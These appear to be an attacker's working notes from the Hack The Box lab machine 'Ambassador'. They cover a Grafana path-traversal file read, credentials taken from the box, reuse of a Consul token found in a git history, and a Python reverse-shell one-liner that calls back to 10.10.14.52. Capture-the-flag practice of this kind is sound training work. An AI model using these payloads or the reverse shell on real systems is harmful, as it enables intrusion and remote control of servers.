`ambassador` account, DevOps should give you an account


grafana CVE

[database]
type = sqlite3
host = 127.0.0.1:3306
name = grafana
user = root

[security]
# default admin user, created on startup
admin_user = admin

# default admin password, can be changed before first start of grafana, or in profile settings
admin_password = admin

# used for signing
secret_key = SW2YcwTIb9zpOOhoPsMm

from `grafana.ini`

#[grafana credentials]
user: admin
pw: messageInABottle685427

lfi_endpoint={domain}/public/plugins/{vuln_payload}{path}
lfi_endpoint=http://ambassador.htb:3000/public/plugins/alertlist/../../../../../../etc/grafana/provisioning/datasources/mysql.yaml

#[database credentials]
grafana
dontStandSoCloseToMe63221!

SELECT `COLUMN_NAME` 
FROM `INFORMATION_SCHEMA`.`COLUMNS` 
WHERE `TABLE_SCHEMA`='yourdatabasename' 
    AND `TABLE_NAME`='user';
    
#[server credentials]
developer
anEnglishManInNewYork027468  ((YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==))


find /opt/my-app
find that it's a git repository

cp -R /opt/my-app /tmp/my-app
cd /tmp/my-app
git log
git checkout -o [to an older checkout]
find the consul http_token (bb03b43b-1d81-d62b-24b5-39540ee469b5)
exploit https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API [ completed]


LINPEAS didnt help much ..



#[rshell]
#!/bin/bash
export RHOST="10.10.14.52";export RPORT=8888;python3 -c 'import
sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"
))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

